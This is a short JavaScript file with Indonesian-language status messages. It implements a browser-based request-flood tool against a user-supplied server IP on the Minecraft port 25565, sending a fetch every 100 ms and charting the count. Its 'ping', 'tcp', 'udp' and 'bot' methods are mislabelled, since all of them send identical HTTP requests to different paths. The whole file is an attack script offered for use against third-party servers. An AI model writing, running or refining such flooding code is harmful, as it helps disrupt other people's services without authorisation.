let attackInterval;
let attackCount = 0;

// Inisialisasi grafik
const ctx = document.getElementById('attackChart').getContext('2d');
const attackChart = new Chart(ctx, {
    type: 'line',
    data: {
        labels: [],
        datasets: [{
            label: 'Requests Sent',
            borderColor: 'red',
            backgroundColor: 'rgba(255, 0, 0, 0.2)',
            data: []
        }]
    },
    options: { responsive: true }
});

function updateChart() {
    attackChart.data.labels.push(attackCount);
    attackChart.data.datasets[0].data.push(attackCount);
    attackChart.update();
}

function startAttack() {
    let serverIP = document.getElementById("serverIP").value;
    let requestCount = parseInt(document.getElementById("requestCount").value);
    let attackMethod = document.getElementById("attackMethod").value;
    let statusDiv = document.getElementById("status");

    if (!serverIP || requestCount <= 0) {
        alert("Masukkan IP dan jumlah request yang valid!");
        return;
    }

    attackCount = 0;
    statusDiv.innerHTML = "Menyerang " + serverIP + " dengan " + attackMethod;

    attackInterval = setInterval(() => {
        if (attackCount >= requestCount) {
            clearInterval(attackInterval);
            statusDiv.innerHTML = "Serangan selesai!";
            return;
        }

        if (attackMethod === "ping") {
            fetch(`http://${serverIP}:25565/ping`).catch(() => {});
        } else if (attackMethod === "tcp") {
            fetch(`http://${serverIP}:25565/tcp`).catch(() => {});
        } else if (attackMethod === "udp") {
            fetch(`http://${serverIP}:25565/udp`).catch(() => {});
        } else if (attackMethod === "bot") {
            fetch(`http://${serverIP}:25565/bot`).catch(() => {});
        }

        attackCount++;
        updateChart();
    }, 100);
}

function stopAttack() {
    clearInterval(attackInterval);
    document.getElementById("status").innerHTML = "Serangan dihentikan!";
}
